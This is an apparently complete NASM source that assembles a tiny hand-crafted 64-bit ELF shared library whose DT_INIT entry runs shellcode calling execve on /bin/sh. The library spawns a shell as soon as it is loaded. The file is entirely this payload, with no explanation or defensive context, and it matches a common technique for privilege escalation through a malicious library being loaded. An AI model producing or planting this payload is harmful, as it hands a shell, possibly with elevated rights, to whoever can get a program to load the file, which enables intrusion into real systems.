bits 64
            org 0x08048000

ehdr:                                           ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db  0
            dw  3                               ;   e_type
            dw  62                              ;   e_machine
            dd  1                               ;   e_version
            dq  _start                          ;   e_entry
            dq  0x40                            ;   e_phoff
            dq  0                               ;   e_shoff
            dd  0                               ;   e_flags
            dw  0x40                            ;   e_ehsize
            dw  0x38                            ;   e_phentsize
            dw  2                               ;   e_phnum
            dw  0                               ;   e_shentsize
            dw  0                               ;   e_shnum
            dw  0                               ;   e_shstrndx

phdr_load:                                           ; Elf64_Phdr
            dd  1                               ;   p_type
            dd  7                               ;   p_flags
            dq  0                               ;   p_offset
            dq  $$                              ;   p_vaddr
            dq  $$                              ;   p_paddr
            dq  filesize                        ;   p_filesz
            dq  filesize                        ;   p_memsz
            dq  0x1000                          ;   p_align

phdr_dyn:                                           ; Elf64_Phdr
            dd  2                               ;   p_type
            dd  6                               ;   p_flags
            dq  dyn_offset                      ;   p_offset
            dq  _dyn                            ;   p_vaddr
            dq  _dyn                            ;   p_paddr
            dq  dyn_size                        ;   p_filesz
            dq  dyn_size                        ;   p_memsz
            dq  0x8                          ;   p_align

_start:
    xor eax, eax
    mul esi
    push rax
    mov rdi, "/bin//sh"
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall

dyn_offset equ $ - $$

_dyn:
    dq 5, 0                     ; DT_STRTAB
    dq 6, 0                     ; DT_SYMTAB
    dq 0Ah, 0h                 ; DT_STRSZ
    dq 0Bh, 0h                 ; DT_SYMENT
    dq 0Ch, _start              ; DT_INIT
    dq 0,0

dyn_size    equ $ - _dyn

filesize      equ     $ - ehdr

